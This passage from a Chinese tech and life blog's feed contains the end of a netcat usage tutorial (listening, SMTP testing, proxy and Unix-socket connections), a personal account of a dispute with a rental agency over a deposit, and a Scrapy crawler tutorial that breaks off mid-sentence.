$ nc -l 2389Client: $ nc -d localhost 2389Hi你输入的 Hi 文本并不会送到服务器端</code></pre><h4 id="强制-Netcat-服务器端保持启动状态"><a href="#强制-Netcat-服务器端保持启动状态" class="headerlink" title="强制 Netcat 服务器端保持启动状态"></a>强制 Netcat 服务器端保持启动状态</h4><pre><code>如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。Server: $ nc -l 2389Client: $ nc localhost 2389^CServer: $ nc -l 2389上述例子中，但客户端断开时服务器端也立即退出。我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。Server: $ nc -k -l 2389Client: $ nc localhost 2389^CServer: $ nc -k -l 2389</code></pre><h4 id="配置-Netcat-客户端不会因为-EOF-而退出"><a href="#配置-Netcat-客户端不会因为-EOF-而退出" class="headerlink" title="配置 Netcat 客户端不会因为 EOF 而退出"></a>配置 Netcat 客户端不会因为 EOF 而退出</h4><pre><code>Netcat 客户端可以通过 -q 参数来控制接收到 EOF 后隔多长时间才退出，该参数的单位是秒：Client: $nc  -q 5  localhost 2389现在如果客户端接收到 EOF ，它将等待 5 秒后退出。</code></pre><h4 id="手动使用-SMTP-协议寄信"><a href="#手动使用-SMTP-协议寄信" class="headerlink" title="手动使用 SMTP 协议寄信"></a>手动使用 SMTP 协议寄信</h4><pre><code>在测试邮件服务器是否正常时，可以使用这样的方式手动发送 Email：$nc localhost 25 &lt;&lt; EOFHELO host.example.comMAIL FROM: &lt;user@host.example.com&gt;RCPT TO: &lt;user2@host.example.com&gt;DATABody of email..QUITEOF</code></pre><h4 id="透过代理服务器（Proxy）连线"><a href="#透过代理服务器（Proxy）连线" class="headerlink" title="透过代理服务器（Proxy）连线"></a>透过代理服务器（Proxy）连线</h4><pre><code>这指令会使用 10.2.3.4:8080 这个代理服务器，连线至 host.example.com 的42端口。$nc -x10.2.3.4:8080 -Xconnect host.example.com 42</code></pre><h4 id="使用-Unix-Domain-Socket"><a href="#使用-Unix-Domain-Socket" class="headerlink" title="使用 Unix Domain Socket"></a>使用 Unix Domain Socket</h4><pre><code>这行指令会建立一个 Unix Domain Socket，并接收资料：$nc -lU /var/tmp/dsocket</code></pre><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h3 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，
因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;1. linux系统安装
# yum install -y nc | nmap-ncat
ps.ubuntu自带的nc是netcat-openbsd版,不带-c/-e参数。

2. windows系统安装
(1)下载
下载netcat。下载地址：https://eternallybored.org/misc/netcat/, 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;/nc/1.png&quot; alt&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;(2)解压文件夹
(3)将文件夹所在路径添加到用户环境变量里
(4)打开命令界面：Windows+R  cmd。输入nc 命令即可
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://yongnights.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://yongnights.github.io/tags/Linux/"/>
    
      <category term="nc" scheme="https://yongnights.github.io/tags/nc/"/>
    
      <category term="Windows" scheme="https://yongnights.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>与房屋中介公司要押金的斗智斗勇</title>
    <link href="https://yongnights.github.io/2019/12/31/%E4%B8%8E%E6%88%BF%E5%B1%8B%E4%B8%AD%E4%BB%8B%E5%85%AC%E5%8F%B8%E8%A6%81%E6%8A%BC%E9%87%91%E7%9A%84%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87/"/>
    <id>https://yongnights.github.io/2019/12/31/与房屋中介公司要押金的斗智斗勇/</id>
    <published>2019-12-31T04:00:48.273Z</published>
    <updated>2019-12-31T04:00:48.273Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:58 GMT+0800 (GMT+08:00) --><p>我是在2017年3月15号开始入住到福元路玉凤路战友苑小区南区的，签了一年的合同，当时还是纸质版的合同，这一年结交了几位朋友，其余没啥说的，直接略过。</p><p>进入到2018年，租房快到期了，我又续费一年，这一年就没有纸质合同了，而是电子合同，支付宝蘑菇租房的那种，在线查看合同租约，在线缴费等。合同上写明的有每次缴费的日期和金额。费用呢，房租还是跟上一年的一样，押一付三，物业费一次性交一年，还有水电燃气押金200元。</p><p>教训第一条：<br>物业费：不同的小区物业费不一样，我这个租的物业费TTMD的贵了，一年730元。后来我换地方租，也就是我现在租的这个，一年的物业费合计396元，相差334元。租房子的时候物业费这个一定要货比三家。</p><a id="more"></a><p>因2017年的租户租期到了陆续都搬走了，新搬进来其他租户，我就自发的让新租户加入微信群，快到缴费的时候就组织大家合计缴费，但是事情发生了，部分租户对费用分摊有很大抵触，各种刁难，有时联系不上，有时联系上了故意拖延转账，耽误了缴费的时间，导致被强行断电，我租住了第一次缴费，实在厌恶这样的，索性懒得管，爱咋地咋地，以后就不管缴费这事儿了。后来由中介那边助理负责这件事儿，每次到缴费的时候就在群里大声疾呼，但是还是会出现强行断电的情况。</p><p>关于停电，有以下两种情况：</p><ol><li>因欠物业费而停电<br>租户把物业费交给中介，中介再把物业费交给小区的物业管理中心，当屋内房间没有租完时，中介有时会不交物业费给物业管理中心，等有人租房子交了物业费中介公司再把物业费给物业管理中心，这中间的时间间隔一长，就会发生物业管理中心因中介未交物业费而强行给房间断电的情况。</li><li>因欠电费而停电<br>2017年的缴费是租户在微信群里自发组织在支付宝里缴费的，大家相处的也很融洽，临走时还海底捞聚餐来着。从未发生过因欠电费、水费或燃气费而被物业管理中心强行停电的情况，2018年则恰恰相反。</li></ol><p>教训第二条：<br>水电和燃气费：现在这些费用都可以通过户号在支付宝里缴纳，水电和燃气的缴纳户号都不一样，具体可以问物业管理中心。这个缴费一定要跟其他租户提前商量好由租户负责，天知道中介助理哪天脑袋抽筋忘了这茬事儿，最主要的是助理摆不平那些刁难的租户。</p><p>我现在租的这个房子，水电和燃气各每天一块钱，合计三者每月90元，然后就随便用。注意这个电是指公用的用电，比如走廊、厨房，卫生间等用电。每个房间内有单独的一个电表，还有一个总电表。这样一来，费用这个就很好计算，也不会出现费用分摊不合理的情况。</p><p>延伸一下：之前租的房间内有一个老旧的中央空调，到夏天的时候，关于是否用这个空调的问题也产生过激烈的争斗。这空调不仅制冷效果不好，还很费电。因部分租户上夜班，这就使空调的使用颇费周折。结果导致空调白天黑夜连轴转，因制冷效果不好，温度还调的很低，导致用电量大大大大增。然后就因电费分摊这个互相扯皮。</p><p>教训第三条：<br>关于房间内的公用设施，比如空凋，洗衣机等，尤其是空调这个电老虎，或者不用，或者不租这类的房子。我现在租的这个，每个房间有一个电表，还有一个总电表，这样一来就把公用电和每个房间的用电给分隔开了。谁想用空调谁自己安装，电费自己缴纳，跟其他费用都不掺和。</p><p>说的有点多了，话题扯的有点远，接下来继续说正事儿。</p><p>房租不是快到期了么，就以上情况，都不想再续租了，提前好几天就跟中介公司联系，让他们过来验收一下房屋，给我尽快办理退房手续。连续三天放我鸽子，明明白天说好了，说是晚上几点几点过来验收办理退房手续，可到点了人没来，也没给我打电话，我直接打电话过去，对方不是说忙，就是说在开会，我当时就有点生气，来不了怎么不打电话或发微信说一声。经历过这件事儿，彻底对这个中介公司很失望，当时心里想着赶紧办完这个事儿，不想跟这样的公司员工打交道。</p><p>终于到房租到期的那一天他们来了，验收一下房屋情况，写了一个费用清单，写了三项，房间卫生，厨房卫生和床板断裂。然后又让我直接在下面写上我的银行账户，签上字。我问他们，说是房间卫生要扣多少，厨房卫生要扣多少，他们不说，只说放心吧，这费用扣的很少。我又问啥时候能把押金给退回来，他们说十五天之内。我把房间钥匙交给他们就走了。心想总算交接完了，接下来等着对方退还押金就是了。</p><p>教训第四条：<br>关于退房验收这个，凡是需要扣款的地方一定要详细的问清楚，比如房屋打扫费用要扣多少，断裂一个床板要扣多少，这个他们肯定知道，不给你的话这里面肯定有他们的阴谋。</p><p>接下来的事情坏就坏在自己想的太想当然了。</p><p>十五天的截止日期快到了，我跟中介助理联系，说是快到期了，押金啥时候退还，他说还有个水费没有结算，让再等几天。没办法，钱在别人手里，别人就是大爷，我只能耐心等了。每天催促他们去抄水表，每次我问都有不同的回复，有一次是有个车压着水表井盖了，还得等等。有一次是抄错水表了，还得再去一趟。看样子目前就卡在水费这一块儿了。</p><p>令我很不解的是都是我主动联系他们那边，问啥情况他们才说，有啥新情况从不主动跟我打电话说。公司就恁穷么，连个电话都舍不得打。。。</p><p>这个难产的水费终于计算出来了，问中介助理啥时候退押金，他说卡在他们总监那边了，他这边处理不了，得，我直接找他总监联系。此时已经进入4月份了，我是3月15号退的房，说好的15天之内退押金这都已经超好几天了。</p><p>跟他们总监联系的时候我当时正在南阳出差，让他把费用清单发过来，按他这清单的费用情况，我那押金不仅一分都要不过来，相反还要倒贴他们部分费用。是可忍孰不可忍，立马就开始跟他怼起来了。</p><p>房间打扫费用扣50，我认了；厨房打扫费用扣50，我也认了；马桶维修费是啥，当时验收的时候明明没这个的，他们竟私自加上去也不跟我说一声，当时就表明这个费用我不认；断裂了一块床板扣200，我一问才知道，他们说断裂一块床板直接给新换一个床，TMD，还得这样处理的，床板我自己都能换，用得着换新的么；重头戏还在后面，还要扣我两天的滞纳金，说是我有一次晚交几天房租，我当时就很纳闷，我这么一个诚实守信的人，做事情都是有时间计划的，绝不可能出现晚交房租的情况，他还理直气壮的说看合同，看合同，按合同办事。。。</p><blockquote><p>出现这种情况看来跟我当时退房时的那种想当然的结果有很大差距</p></blockquote><p>我当时在南阳出差，不能因为这个分心，当时就决定这件事儿先放一放，等我出差的事儿办好回郑州之后再慢慢梳理。</p><p>回郑州后我仔细查看合同，终于发现这其中的关窍所在了。</p><p>对方想的是：我是15号租的房子，按理说应该是到第三个月的15号交下三个月的房租，我有一次是在17号交的房租，其余三次都是在15号交的房租。晚交两天理应要扣滞纳金。可合同很打脸，合同中明明写的有我每次需要交房租的具体时间，都是17号，从来没有15号这一说，我那三次15号交的还是提前两天交的呢。撇开这个不说，假如就算我应该在15号交房租，可是违约责任中写的也很清楚，若超过交租日期，贰日内仍不缴纳的，才算我违约。TDYD，给我口口声声说看合同，按合同办事儿，你都没看合同还好意思这样说。</p><p>等我把合同截图给他发过去，尤其是给他注明交租日期和违约责任条款时，就不信你不认。终于这个滞纳金不扣了。</p><p>不过查看合同我才发现，合同中有一个不足之处，违约责任中只说明对租户违约责任的处罚，对他们违约责任的处罚则没有。这一点尤其要注意，就算把他们告上法庭，合同中并没有对他们的违约处罚，究竟要如何处罚他们估计仍免不了一份唇枪舌剑。这个考虑也是我后来妥协的原因，因为这件事儿我耽搁的时间太多了，他们的时间不珍惜，我得珍惜我的时间才行。</p><p>教训第五条：<br>租房子之前已经要看请合同内容，看仔细合同内容，看明白合同内容。就算后期维权也是以这个合同为准，当时的口头协议就怕到时候他们翻脸不认。</p><p>维修马桶费用不扣了，滞纳金费用不扣了，还剩一个断裂的床板儿，床板断裂一块儿，我是应该赔偿的，可是用得着直接赔一个新床么，就算要赔一个新床，最起码也得跟我打电话说一声吧，可是没给我打电话。然后问他新床是谁换的，有收据没，对方也不提供，只说你损坏了你就得赔偿，后面的用不着你管，你只管赔偿就行。我反问拖欠我恁长时间押金不退换你们咋赔偿，哑巴了吧。。懒得再跟他们扯皮了，我浪费不起这就时间， 这个费用我认了，也认栽了。</p><p>商量好应该退还的剩余费用后，说好是两天之内退还到我账户，那我就没啥可说的了，等待到账就行了。</p><p>可是我想的还是太单纯了，两天之内的第二天我快下班的时候还没到账，再次一个电话打过去，对方说这几天财务休息，没法转账。没发转账你倒是给我打电话说呀，我不主动打电话问就啥都不说。</p><p>正好那一天的明天我休息，正好到他们公司去要账去。</p><p>接待我的是另一个，问了情况之后说是他今天下午6点之前一定转账，若不转账明天再过来直接给你现金。我给他说要留一下他的手机号，他还让我联系之前那一个人，呵呵。。。</p><p>我还特意上网搜索了一下这个中介公司，一查不得了，2019年还没过几个月呢，都已经被告上多次了。<br><img src="/boxuan/boxuan_1.png" alt></p><p>百度贴吧郑州吧截图<br><img src="/boxuan/boxuan_2.png" alt></p><p>教训第六条：<br>当自己的合法权益收到侵害时，不要退缩，要勇于站出来跟他们抗争，据礼以搏，就算结果不怎么如意，最起码心里出了这口气，也不能让他们过的太安生。。。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:58 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;我是在2017年3月15号开始入住到福元路玉凤路战友苑小区南区的，签了一年的合同，当时还是纸质版的合同，这一年结交了几位朋友，其余没啥说的，直接略过。&lt;/p&gt;&lt;p&gt;进入到2018年，租房快到期了，我又续费一年，这一年就没有纸质合同了，而是电子合同，支付宝蘑菇租房的那种，在线查看合同租约，在线缴费等。合同上写明的有每次缴费的日期和金额。费用呢，房租还是跟上一年的一样，押一付三，物业费一次性交一年，还有水电燃气押金200元。&lt;/p&gt;&lt;p&gt;教训第一条：&lt;br&gt;物业费：不同的小区物业费不一样，我这个租的物业费TTMD的贵了，一年730元。后来我换地方租，也就是我现在租的这个，一年的物业费合计396元，相差334元。租房子的时候物业费这个一定要货比三家。&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="https://yongnights.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://yongnights.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>scrapy学习</title>
    <link href="https://yongnights.github.io/2019/12/31/scrapy%E5%AD%A6%E4%B9%A0/"/>
    <id>https://yongnights.github.io/2019/12/31/scrapy学习/</id>
    <published>2019-12-31T04:00:48.271Z</published>
    <updated>2019-12-31T04:00:48.271Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:58 GMT+0800 (GMT+08:00) --><h3 id="scrapy是什么"><a href="#scrapy是什么" class="headerlink" title="scrapy是什么"></a>scrapy是什么</h3><pre><code>Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。</code></pre><h3 id="scrapy架构图"><a href="#scrapy架构图" class="headerlink" title="scrapy架构图"></a>scrapy架构图</h3><pre><code>绿线是数据流向</code></pre><p><img src="https://i.imgur.com/RpWDwoz.png" alt></p><pre><code>Scrapy Engine(引擎): 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。Scheduler(调度器): 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</code></pre><a id="more"></a><pre><code>Downloader（下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理，Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。Downloader Middlewares（下载中间件）：你可以当作是一个可以自定义扩展下载功能的组件。Spider Middlewares（Spider中间件）：你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）注意！只有当调度器中不存在任何request了，整个程序才会停止，（也就是说，对于下载失败的URL，Scrapy也会重新下载。）制作 Scrapy 爬虫 一共需要4步：新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目明确目标 （编写items.py）：明确你想要抓取的目标制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页存储内容 （pipelines.py）：设计管道存储爬取内容</code></pre><h3 id="scrapy安装"><a href="#scrapy安装" class="headerlink" title="scrapy安装"></a>scrapy安装</h3><pre><code>1. 如果你用的是Anaconda或者Minconda，可以使用下面的命令：conda install -c conda-forge scrapy2. 如果你已经安装了python包管理工具PyPI，可以使用下面命令进行安装：pip install Scrapy。值得注意的是，如果你使用的是pip安装，你需要解决相应的包依赖。scrapy依赖的一些包：lxml：一种高效的XML和HTML解析器，PARSEL：一个HTML / XML数据提取库，基于上面的lxml，w3lib：一种处理URL和网页编码多功能辅助twisted,：一个异步网络框架cryptography and pyOpenSSL，处理各种网络级安全需求以上包需要的最低版本：Twisted 14.0lxml 3.4pyOpenSSL 0.14常见依赖问题:1.错误提示：ModuleNotFoundError: No module named &apos;win32api&apos;解决方法：(1)到这个网站下载跟使用的Python版本相匹配的软件：https://github.com/mhammond/pywin32/releases(2)进入使用的Python解释器里的Scripts目录，里面有一个easy_install.exe文件(3)打开命令行，使用如下命令进行安装：easy_install.exe pywin32-224.win-amd64-py3.6.exe2.错误提示：building &apos;twisted.test.raiser&apos; extension解决方法：(1)到这个网站下载跟使用的Python版本相匹配的软件：https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted(2)进入使用的Python解释器里的Scripts目录，里面有一个pip.exe文件(3)打开命令行，使用如下命令进行安装：pip.exe Twisted-18.9.0-cp36-cp36m-win_amd64.whl</code></pre><h4 id="win7安装scrapy"><a href="#win7安装scrapy" class="headerlink" title="win7安装scrapy"></a>win7安装scrapy</h4><pre><code>推荐使用Anaconda进行安装</code></pre><h4 id="CentOS-7安装scrapy"><a href="#CentOS-7安装scrapy" class="headerlink" title="CentOS 7安装scrapy"></a>CentOS 7安装scrapy</h4><pre><code>CentOS 7系统自带的python版本是2.7，若是python3.5+版本，则不用再安装pip了。(1)安装pip# yum -y install epel-release# yum install python-pip# pip install --upgrade pip(2)安装依赖包# yum install gcc libffi-devel python-devel openssl-devel -y(3)安装scrapy# pip install scrapy</code></pre><h3 id="scrapy入门"><a href="#scrapy入门" class="headerlink" title="scrapy入门"></a>scrapy入门</h3><h4 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h4><pre><code>在开始爬取之前，首先要创建一个scrapy项目，在命令行输入一下命令即可创建:# scrapy startproject mySpiderscrapy  startproject是固定写法，注意scrapy和startproject和mySpider中间是有空格的！ mySpider 为项目名称，可以看到将会创建一个 mySpider 文件夹，目录结构大致如下：mySpider/    scrapy.cfg    mySpider/        __init__.py        items.py        pipelines.py        settings.py        spiders/            __init__.py            ......这些文件分别是:    scrapy.cfg: 项目的配置文件。    mySpider/: 项目的Python模块，将会从这里引用代码。    mySpider/items.py: 项目的目标文件。    mySpider/pipelines.py: 项目的管道文件。    mySpider/settings.py: 项目的设置文件。    mySpider/spiders/: 存储爬虫代码目录。</code></pre><h4 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h4><pre><code>打开 mySpider 目录下的 items.py，Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field 的类属性来定义一个 Item（可以理解成类似于 ORM 的映射关系）。创建一个 ItcastItem 类，和构建 item 模型（model）：import scrapyclass ItcastItem(scrapy.Item):   name = scrapy.Field()   title = scrapy.Field()   info = scrapy.Field()</code></pre><h4 id="制作爬虫"><a href="#制作爬虫" class="headerlink" title="制作爬虫"></a>制作爬虫</h4><pre><code>命令：scrapy genspider mingyan2 mingyan2.commingyan2为蜘蛛名，mingyan2.com为要爬取的网站地址</code></pre><h4 id="运行蜘蛛"><a href="#运行蜘蛛" class="headerlink" title="运行蜘蛛"></a>运行蜘蛛</h4><pre><code>命令：scrapy crawl  mingyan2要重点提醒一下，我们一定要进入：mingyan 这个目录，也就是我们创建的蜘蛛项目目录，以上命令才有效！还有 crawl 后面跟的mingyan2是你类里面定义的蜘蛛名，也就是：name，并不是项目名、也不是类名。</code></pre><h4 id="scrapy-start-url（初始链接）的两种不同写法"><a href="#scrapy-start-url（初始链接）的两种不同写法" class="headerlink" title="scrapy start_url（初始链接）的两种不同写法"></a>scrapy start_url（初始链接）的两种不同写法</h4><pre><code>第一种：start_urls = [  # 另外一种写法，无需定义start_requests方法    &apos;http://lab.scrapyd.cn/page/1/&apos;,    &apos;http://lab.scrapyd.cn/page/2/&apos;,]，必须定义一个方法为：def parse(self, response)，方法名一定是：parse第二种：自己定义一个start_requests()方法示例代码：&quot;&quot;&quot;scrapy初始Url的两种写法，一种是常量start_urls，并且需要定义一个方法parse（）另一种是直接定义一个方法：star_requests()&quot;&quot;&quot;import scrapyclass simpleUrl(scrapy.Spider):    name = &quot;simpleUrl&quot;    start_urls = [  #另外一种写法，无需定义start_requests方法        &apos;http://lab.scrapyd.cn/page/1/&apos;,        &apos;http://lab.scrapyd.cn/page/2/&apos;,    ]    # 另外一种初始链接写法    # def start_requests(self):    #     urls = [ #爬取的链接由此方法通过下面链接爬取页面    #         &apos;http://lab.scrapyd.cn/page/1/&apos;,    #         &apos;http://lab.scrapyd.cn/page/2/&apos;,    #     ]    #     for url in urls:    #         yield scrapy.Request(url=url, callback=self.parse)    # 如果是简写初始url，此方法名必须为：parse    def parse(self, response):        page = response.url.split(&quot;/&quot;)[-2]        filename = &apos;mingyan-%s.html&apos; % page        with open(filename, &apos;wb&apos;) as f:            f.write(response.body)        self.log(&apos;保存文件: %s&apos; % filename)</code></pre><h4 id="scrapy调试工具：scrapy-shell使用方法"><a href="#scrapy调试工具：scrapy-shell使用方法" class="headerlink" title="scrapy调试工具：scrapy shell使用方法"></a>scrapy调试工具：scrapy shell使用方法</h4><pre><code>进入scrapy shell调试命令：scrapy shell http://lab.scrapyd.cnscrapy shell 是固定格式，后面跟的是你要调试的页面。这段代码就是一个下载的过程，一执行这么一段代码scrapy就立马把我们相应链接的相应页面给拿到了</code></pre><h4 id="scrapy-css选择器使用"><a href="#scrapy-css选择器使用" class="headerlink" title="scrapy css选择器使用"></a>scrapy css选择器使用</h4><pre><code>进入scrapy shell调试命令：scrapy shell http://lab.scrapyd.cn在命令行输入如下命令：&gt;&gt;&gt; response.css(&apos;title&apos;) [&lt;Selector xpath=&apos;descendant-or-self::title&apos; data=&apos;&lt;title&gt;SCRAPY爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;&gt;]使用这个命令提取的一个Selector的列表，并不是我们想要的数据；那我们再使用scrapy给我们准备的一些函数来进一步提取，那我们改变一下上面的写法，&gt;&gt;&gt; response.css(&apos;title&apos;).extract()[&apos;&lt;title&gt;SCRAPY爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;]我们只是在后面加入了：extract() 这么一个函数你就提取到了我们标签的一个列表，更近一步了，那如果我们不要列表，只要title这个标签，要怎么处理呢，看我们的输入：&gt;&gt;&gt;  response.css(&apos;title&apos;).extract()[0]&apos;&lt;title&gt;爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;这里的话，我们只需要在后面添加：[0]，那代表提取这个列表中的第一个元素，那就得到了我们的title字符串；这里的话scrapy也给我提供了另外一个函数，可以这样来写，一样的效果：&gt;&gt;&gt;  response.css(&apos;title&apos;).extract_first()&apos;&lt;title&gt;爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;extract_first()就代表提取第一个元素，和我们的：[0]，一样的效果，只是更简洁些，至此我们已经成功提取到了我们的title，但是你会发现，肿么多了一个title标签，这并不是你需要的，那要肿么办呢，我们可以继续改变一下以上的输入：&gt;&gt;&gt; response.css(&apos;title::text&apos;).extract_first()&apos;爬虫实验室 - SCRAPY中文网提供&apos;在title后面加上了 ::text ,这代表提取标签里面的数据，至此，我们已经成功提取到了我们需要的数据：&apos;爬虫实验室 - SCRAPY中文网提供&apos;总结一下，其实就这么一段代码：response.css(&apos;title::text&apos;).extract_first()</code></pre><h4 id="scrapy提取一组数据"><a href="#scrapy提取一组数据" class="headerlink" title="scrapy提取一组数据"></a>scrapy提取一组数据</h4><pre><code>class选择器使用的是&quot;.&quot;,比如.text ，如果是id选择器的话：使用&quot;#&quot;,比如 #text示例代码：import scrapyclass itemSpider(scrapy.Spider):    name = &apos;itemSpider&apos;    start_urls = [&apos;http://lab.scrapyd.cn&apos;]    def parse(self, response):        mingyan = response.css(&apos;div.quote&apos;)[0]        text = mingyan.css(&apos;.text::text&apos;).extract_first()  # 提取名言        autor = mingyan.css(&apos;.author::text&apos;).extract_first()  # 提取作者        tags = mingyan.css(&apos;.tags .tag::text&apos;).extract()  # 提取标签        tags = &apos;,&apos;.join(tags)  # 数组转换为字符串        fileName = &apos;%s-语录.txt&apos; % autor  # 爬取的内容存入文件，文件名为：作者-语录.txt        f = open(fileName, &quot;a+&quot;)  # 追加写入文件        f.write(text)  # 写入名言内容        f.write(&apos;\n&apos;)  # 换行        f.write(&apos;标签：&apos;+tags)  # 写入标签        f.close()  # 关闭文件操作</code></pre><h4 id="scrapy-爬取多条数据"><a href="#scrapy-爬取多条数据" class="headerlink" title="scrapy 爬取多条数据"></a>scrapy 爬取多条数据</h4><pre><code>这次比上次唯一多了个递归调用，我们来看一下关键变化，原先我们取出一条数据，用的是如下表达式：mingyan = response.css(&apos;div.quote&apos;)[0]我们在后面添加了游标 [0]  表示只取出第一条，那我们要取出全部，那我们就不用加了，直接：mingyan = response.css(&apos;div.quote&apos;)那现在的变量就是一个数据集，里面有多条数据了，那接下来我们要做的就是循环取出数据集里面的每一条数据，那我们看一下怎么做：mingyan = response.css(&apos;div.quote&apos;)  # 提取首页所有名言，保存至变量mingyanfor v in mingyan:  # 循环获取每一条名言里面的：名言内容、作者、标签    text = v.css(&apos;.text::text&apos;).extract_first()  # 提取名言    autor = v.css(&apos;.author::text&apos;).extract_first()  # 提取作者    tags = v.css(&apos;.tags .tag::text&apos;).extract()  # 提取标签    tags = &apos;,&apos;.join(tags)  # 数组转换为字符串    # 接下来，进行保存可以看到，关键是：for v in mingyan:表示把 mingyan 这个数据集里面的数据，循环赋值给：v ，第一次循环的话 v 就代表第一条数据，那text = v.css(&apos;.text::text&apos;).extract_first() 就代表第一条数据的名言内容，以此类推，把所有数据都取了出来，最终进行保存，我们看一下完整的代码：import scrapyclass itemSpider(scrapy.Spider):    name = &apos;listSpider&apos;    start_urls = [&apos;http://lab.scrapyd.cn&apos;]    def parse(self, response):        mingyan = response.css(&apos;div.quote&apos;)  # 提取首页所有名言，保存至变量mingyan        for v in mingyan:  # 循环获取每一条名言里面的：名言内容、作者、标签            text = v.css(&apos;.text::text&apos;).extract_first()  # 提取名言            autor = v.css(&apos;.author::text&apos;).extract_first()  # 提取作者            tags = v.css(&apos;.tags .tag::text&apos;).extract()  # 提取标签            tags = &apos;,&apos;.join(tags)  # 数组转换为字符串            &quot;&quot;&quot;            接下来进行写文件操作，每个名人的名言储存在一个txt文档里面            &quot;&quot;&quot;            fileName = &apos;%s-语录.txt&apos; % autor  # 定义文件名,如：木心-语录.txt            with open(fileName, &quot;a+&quot;) as f:  # 不同人的名言保存在不同的txt文档，“a+”以追加的形式                f.write(text)                f.write(&apos;\n&apos;)  # ‘\n’ 表示换行                f.write(&apos;标签：&apos; + tags)                f.write(&apos;\n-------\n&apos;)                f.close()</code></pre><h4 id="scrapy-爬取下一页"><a href="#scrapy-爬取下一页" class="headerlink" title="scrapy 爬取下一页"></a>scrapy 爬取下一页</h4><pre><code>要爬取下一页，那我们首先要分析链接格式，找到下一页的链接，那爬取就简单了。下一页的链接如下：&lt;li class=&quot;next&quot;&gt;    &lt;a href=&quot;http://lab.scrapyd.cn/page/2/&quot;&gt;下一页 »&lt;/a&gt;&lt;/li&gt;每爬一页就用css选择器来查询，是否存在下一页链接，存在：则爬取下一页链接：http://lab.scrapyd.cn/page/*/，然后把下一页链接提交给当前爬取的函数，继续爬取，继续查找下一页，知道找不到下一页，说明所有页面已经爬完，那结束爬虫。</code></pre><p><img src="https://i.imgur.com/y1pDfXA.png" alt></p><pre><code>爬取内容的代码和上一文档（listSpider）一模一样，唯一区别的是这么一个地方，我们在：listSpider 蜘蛛下面添加了这么几段代码：next_page = response.css(&apos;li.next a::attr(href)&apos;).extract_first()          if next_page is not None:             next_page = response.urljoin(next_page)            yield scrapy.Request(next_page, callback=self.parse)首先：我们使用：response.css(&apos;li.next a::attr(href)&apos;).extract_first()查看有木有存在下一页链接，如果存在的话，我们使用：urljoin(next_page)把相对路径，如：page/1转换为绝对路径，其实也就是加上网站域名，如：http://lab.scrapyd.cn/page/1；接下来就是爬取下一页或是内容页的秘诀所在，scrapy给我们提供了这么一个方法：scrapy.Request()这个方法还有许多参数，后面我们慢慢说，这里我们只使用了两个参数，一个是：我们继续爬取的链接（next_page），这里是下一页链接，当然也可以是内容页；另一个是：我们要把链接提交给哪一个函数爬取，这里是parse函数，也就是本函数；当然，我们也可以在下面另写一个函数，比如：内容页，专门处理内容页的数据。经过这么一个函数，下一页链接又提交给了parse，那就可以不断的爬取了，直到不存在下一页；</code></pre><h4 id="scrapy-arguments：指定蜘蛛参数爬取"><a href="#scrapy-arguments：指定蜘蛛参数爬取" class="headerlink" title="scrapy arguments：指定蜘蛛参数爬取"></a>scrapy arguments：指定蜘蛛参数爬取</h4><pre><code>scrapy提供了可传参的爬虫，首先按scrapy 